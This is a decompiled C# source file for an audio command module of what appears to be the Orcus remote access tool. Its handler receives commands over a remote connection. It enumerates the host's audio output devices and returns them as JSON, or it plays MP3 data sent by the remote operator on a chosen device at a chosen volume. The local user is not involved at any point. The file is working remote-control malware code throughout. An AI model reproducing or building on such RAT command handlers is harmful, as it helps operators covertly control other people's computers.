using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;
using CSCore;
using CSCore.Codecs.MP3;
using CSCore.CoreAudioAPI;
using CSCore.DirectSound;
using CSCore.SoundOut;
using Orcus.Plugins;
using Orcus.Shared.Commands.Audio;
using Orcus.Shared.NetSerializer;
using Orcus.Utilities;

namespace Orcus.Commands.Audio;

internal class AudioCommand : Command
{
	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0009: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Invalid comparison between Unknown and I4
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		//IL_00b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_011d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_0147: Unknown result type (might be due to invalid IL or missing references)
		//IL_014c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Expected O, but got Unknown
		//IL_01a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Expected O, but got Unknown
		//IL_01d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01df: Expected O, but got Unknown
		AudioCommunication val = (AudioCommunication)parameter[0];
		if ((int)val != 0)
		{
			if ((int)val != 1)
			{
				throw new ArgumentOutOfRangeException("parameter", parameter, null);
			}
			List<SoundOutDevice> list;
			if (WasapiOut.get_IsSupportedOnCurrentPlatform())
			{
				MMDeviceEnumerator val2 = new MMDeviceEnumerator();
				try
				{
					MMDevice defaultDevice = val2.GetDefaultAudioEndpoint((DataFlow)0, (Role)1);
					list = new List<SoundOutDevice>(((IEnumerable<MMDevice>)val2.EnumAudioEndpoints((DataFlow)0, (DeviceState)1)).Select((Func<MMDevice, SoundOutDevice>)delegate(MMDevice enumAudioEndpoint)
					{
						//IL_0000: Unknown result type (might be due to invalid IL or missing references)
						//IL_0005: Unknown result type (might be due to invalid IL or missing references)
						//IL_0011: Unknown result type (might be due to invalid IL or missing references)
						//IL_002d: Unknown result type (might be due to invalid IL or missing references)
						//IL_003a: Expected O, but got Unknown
						SoundOutDevice val9 = new SoundOutDevice();
						val9.set_Id(enumAudioEndpoint.get_DeviceID());
						val9.set_IsDefault(enumAudioEndpoint.get_DeviceID() == defaultDevice.get_DeviceID());
						val9.set_Name(enumAudioEndpoint.get_FriendlyName());
						return val9;
					}));
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			else
			{
				list = ((IEnumerable<DirectSoundDevice>)DirectSoundDeviceEnumerator.EnumerateDevices()).Select((Func<DirectSoundDevice, SoundOutDevice>)delegate(DirectSoundDevice x)
				{
					//IL_0000: Unknown result type (might be due to invalid IL or missing references)
					//IL_0005: Unknown result type (might be due to invalid IL or missing references)
					//IL_001e: Unknown result type (might be due to invalid IL or missing references)
					//IL_002a: Unknown result type (might be due to invalid IL or missing references)
					//IL_0032: Expected O, but got Unknown
					SoundOutDevice val8 = new SoundOutDevice();
					val8.set_Id(x.get_Guid().ToString("N"));
					val8.set_Name(x.get_Description());
					val8.set_IsDefault(false);
					return val8;
				}).ToList();
			}
			List<byte> list2 = new List<byte> { 2 };
			list2.AddRange(Encoding.UTF8.GetBytes(new JavaScriptSerializer().Serialize((object)list)));
			connectionInfo.CommandResponse((Command)(object)this, list2.ToArray(), (PackageCompression)0);
			return;
		}
		if (CoreHelper.RunningOnXP)
		{
			connectionInfo.CommandResponse((Command)(object)this, new byte[1] { 4 }, (PackageCompression)0);
			return;
		}
		Serializer val3 = new Serializer(typeof(PlayAudioInformation));
		PlayAudioInformation playInformation = val3.Deserialize<PlayAudioInformation>(parameter, 1);
		ISoundOut soundOut;
		if (WasapiOut.get_IsSupportedOnCurrentPlatform())
		{
			MMDeviceEnumerator val4 = new MMDeviceEnumerator();
			try
			{
				MMDevice val5 = ((IEnumerable<MMDevice>)val4.EnumAudioEndpoints((DataFlow)0, (DeviceState)1)).FirstOrDefault((Func<MMDevice, bool>)((MMDevice x) => x.get_DeviceID() == playInformation.get_SoundOutId()));
				if (val5 == null)
				{
					return;
				}
				WasapiOut val6 = new WasapiOut();
				val6.set_Device(val5);
				soundOut = (ISoundOut)val6;
			}
			finally
			{
				((IDisposable)val4)?.Dispose();
			}
		}
		else
		{
			ReadOnlyCollection<DirectSoundDevice> source = DirectSoundDeviceEnumerator.EnumerateDevices();
			Guid guid = new Guid(playInformation.get_SoundOutId());
			if (((IEnumerable<DirectSoundDevice>)source).FirstOrDefault((Func<DirectSoundDevice, bool>)((DirectSoundDevice x) => x.get_Guid() == guid)) == null)
			{
				return;
			}
			DirectSoundOut val7 = new DirectSoundOut();
			val7.set_Device(guid);
			soundOut = (ISoundOut)val7;
		}
		MemoryStream memoryStream = new MemoryStream(playInformation.get_AudioData());
		IWaveSource waveSource = (IWaveSource)new DmoMp3Decoder((Stream)memoryStream);
		soundOut.Initialize(waveSource);
		soundOut.set_Volume(playInformation.get_Volume());
		soundOut.Play();
		soundOut.add_Stopped((EventHandler<PlaybackStoppedEventArgs>)delegate
		{
			new Thread((ThreadStart)delegate
			{
				((IDisposable)soundOut).Dispose();
				((IDisposable)waveSource).Dispose();
				memoryStream.Dispose();
			}).Start();
		});
		connectionInfo.CommandResponse((Command)(object)this, new byte[1] { 3 }, (PackageCompression)0);
	}

	protected override uint GetId()
	{
		return 1u;
	}
}
